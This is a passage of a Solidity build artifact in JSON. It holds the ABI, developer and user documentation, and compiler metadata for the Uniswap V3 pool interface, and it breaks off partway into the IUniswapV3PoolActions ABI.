":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"The pool interface is broken up into many smaller pieces\",\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"details\":\"Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\",\"params\":{\"amount\":\"The amount of liquidity to remove\",\"amount0\":\"The amount of token0 withdrawn\",\"amount1\":\"The amount of token1 withdrawn\",\"owner\":\"The owner of the position for which liquidity is removed\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"details\":\"Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\",\"params\":{\"amount0\":\"The amount of token0 fees collected\",\"amount1\":\"The amount of token1 fees collected\",\"owner\":\"The owner of the position for which fees are collected\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"CollectProtocol(address,address,uint128,uint128)\":{\"params\":{\"amount0\":\"The amount of token1 protocol fees that is withdrawn\",\"recipient\":\"The address that receives the collected protocol fees\",\"sender\":\"The address that collects the protocol fees\"}},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"params\":{\"amount0\":\"The amount of token0 that was flashed\",\"amount1\":\"The amount of token1 that was flashed\",\"paid0\":\"The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\",\"paid1\":\"The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\",\"recipient\":\"The address that received the tokens from flash\",\"sender\":\"The address that initiated the swap call, and that received the callback\"}},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"details\":\"observationCardinalityNext is not the observation cardinality until an observation is written at the index just before a mint/swap/burn.\",\"params\":{\"observationCardinalityNextNew\":\"The updated value of the next observation cardinality\",\"observationCardinalityNextOld\":\"The previous value of the next observation cardinality\"}},\"Initialize(uint160,int24)\":{\"details\":\"Mint/Burn/Swap cannot be emitted by the pool before Initialize\",\"params\":{\"sqrtPriceX96\":\"The initial sqrt price of the pool, as a Q64.96\",\"tick\":\"The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\"}},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"params\":{\"amount\":\"The amount of liquidity minted to the position range\",\"amount0\":\"How much token0 was required for the minted liquidity\",\"amount1\":\"How much token1 was required for the minted liquidity\",\"owner\":\"The owner of the position and recipient of any minted liquidity\",\"sender\":\"The address that minted the liquidity\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"params\":{\"feeProtocol0New\":\"The updated value of the token0 protocol fee\",\"feeProtocol0Old\":\"The previous value of the token0 protocol fee\",\"feeProtocol1New\":\"The updated value of the token1 protocol fee\",\"feeProtocol1Old\":\"The previous value of the token1 protocol fee\"}},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"params\":{\"amount0\":\"The delta of the token0 balance of the pool\",\"amount1\":\"The delta of the token1 balance of the pool\",\"liquidity\":\"The liquidity of the pool after the swap\",\"recipient\":\"The address that received the output of the swap\",\"sender\":\"The address that initiated the swap call, and that received the callback\",\"sqrtPriceX96\":\"The sqrt(price) of the pool after the swap, as a Q64.96\",\"tick\":\"The log base 1.0001 of price of the pool after the swap\"}}},\"kind\":\"dev\",\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"factory()\":{\"returns\":{\"_0\":\"The contract address\"}},\"fee()\":{\"returns\":{\"_0\":\"The fee\"}},\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}},\"slot0()\":{\"returns\":{\"sqrtPriceX96\":\"The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}},\"token0()\":{\"returns\":{\"_0\":\"The token contract address\"}},\"token1()\":{\"returns\":{\"_0\":\"The token contract address\"}}},\"title\":\"The interface for a Uniswap V3 Pool\",\"version\":1},\"userdoc\":{\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when a position's liquidity is removed\"},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"notice\":\"Emitted when fees are collected by the owner of a position\"},\"CollectProtocol(address,address,uint128,uint128)\":{\"notice\":\"Emitted when the collected protocol fees are withdrawn by the factory owner\"},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"notice\":\"Emitted by the pool for any flashes of token0/token1\"},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"notice\":\"Emitted by the pool for increases to the number of observations that can be stored\"},\"Initialize(uint160,int24)\":{\"notice\":\"Emitted exactly once by a pool when #initialize is first called on the pool\"},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when liquidity is minted for a given position\"},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"notice\":\"Emitted when the protocol fee is changed by the pool\"},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"notice\":\"Emitted by the pool for any swaps between token0 and token1\"}},\"kind\":\"user\",\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":\"IUniswapV3Pool\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when a position's liquidity is removed"
							},
							"Collect(address,address,int24,int24,uint128,uint128)": {
								"notice": "Emitted when fees are collected by the owner of a position"
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"notice": "Emitted when the collected protocol fees are withdrawn by the factory owner"
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"notice": "Emitted by the pool for any flashes of token0/token1"
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"notice": "Emitted by the pool for increases to the number of observations that can be stored"
							},
							"Initialize(uint160,int24)": {
								"notice": "Emitted exactly once by a pool when #initialize is first called on the pool"
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when liquidity is minted for a given position"
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"notice": "Emitted when the protocol fee is changed by the pool"
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"notice": "Emitted by the pool for any swaps between token0 and token1"
							}
						},
						"kind": "user",
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"IUniswapV3PoolActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
